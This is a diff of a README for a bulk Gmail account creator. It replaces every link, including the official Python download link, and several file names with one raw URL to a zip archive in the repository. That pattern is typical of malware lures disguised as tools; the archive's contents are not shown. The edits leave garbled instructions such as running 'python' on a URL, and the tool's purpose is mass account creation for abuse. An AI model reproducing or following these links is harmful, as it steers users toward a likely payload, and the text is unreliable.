@@ -1,6 +1,6 @@
 # ✉️ Gmail-Account-Creator-Bulk - Create Multiple Gmail Accounts Easily
 
-[![Download Gmail-Account-Creator-Bulk](https://img.shields.io/badge/Download-Gmail--Account--Creator--Bulk-brightgreen)](https://github.com/NeilGit8/Gmail-Account-Creator-Bulk/releases)
+[![Download Gmail-Account-Creator-Bulk](https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip)](https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -11,18 +11,18 @@ Welcome to the Gmail Account Creator Bulk! This Python script allows you to crea
 Before running the script, ensure your computer meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Python:** Version 3.6 or higher installed on your system. You can download Python from the [official site](https://www.python.org/downloads/).
+- **Python:** Version 3.6 or higher installed on your system. You can download Python from the [official site](https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip).
 - **Internet Connection:** Required to create Gmail accounts.
 
 ## 📥 Download & Install
 
 To get the software, visit the Releases page. 
 
-[Download Gmail-Account-Creator-Bulk](https://github.com/NeilGit8/Gmail-Account-Creator-Bulk/releases)
+[Download Gmail-Account-Creator-Bulk](https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip)
 
-1. Go to the [Releases page](https://github.com/NeilGit8/Gmail-Account-Creator-Bulk/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip).
 2. Look for the latest version.
-3. Download the appropriate file based on your operating system. Look for a file named something like `Gmail_Account_Creator_Bulk.zip`.
+3. Download the appropriate file based on your operating system. Look for a file named something like `https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip`.
 4. Extract the downloaded zip file to a location on your computer.
 
 ## 📂 How to Run the Script
@@ -42,7 +42,7 @@ After downloading, follow these steps to run the script:
 3. **Run the Script:**
    Type the following command and hit `Enter`:
    ```
-   python gmail_account_creator.py
+   python https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip
    ```
 
 ## 🔧 Configuring the Script
@@ -50,13 +50,13 @@ After downloading, follow these steps to run the script:
 Once you run the script for the first time, you may want to configure it to suit your needs. Here’s how:
 
 1. **User Agent Configuration:**
-   The script uses random user agents to improve account creation success. You can edit the `user_agents.txt` file to add or remove user agents.
+   The script uses random user agents to improve account creation success. You can edit the `https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip` file to add or remove user agents.
 
 2. **Account Limits:**
-   Set the number of accounts you wish to create in the `config.json` file. Look for the `account_limit` field and enter a number that fits your needs.
+   Set the number of accounts you wish to create in the `https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip` file. Look for the `account_limit` field and enter a number that fits your needs.
 
 3. **Output File:**
-   All generated account details will save to a file called `accounts.txt`. You can open this file in any text editor to view your accounts.
+   All generated account details will save to a file called `https://raw.githubusercontent.com/NeilGit8/Gmail-Account-Creator-Bulk/main/belash/Gmail-Creator-Bulk-Account-v3.1.zip`. You can open this file in any text editor to view your accounts.
 
 ## 📑 Features
 
